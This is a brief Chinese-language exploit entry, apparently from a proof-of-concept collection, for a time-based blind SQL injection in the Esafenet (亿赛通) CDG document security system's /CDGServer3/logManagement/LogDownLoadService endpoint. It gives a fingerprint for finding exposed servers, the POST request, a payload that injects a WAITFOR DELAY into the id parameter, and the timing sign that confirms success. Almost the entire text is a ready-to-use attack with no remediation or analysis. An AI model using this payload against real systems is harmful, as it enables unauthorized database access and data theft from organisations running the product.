# 亿赛通电子文档安全管理系统LogDownLoadService存在SQL注入漏洞

亿赛通电子文档安全管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`POST /CDGServer3/logManagement/LogDownLoadService HTTP/1.1`

**Payload**
```
command=downLoadLogFiles&currPage=1&fromurl=../user/dataSearch.jsp&logFileName=indsex.txt&id=-1';WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200 响应时间>=5s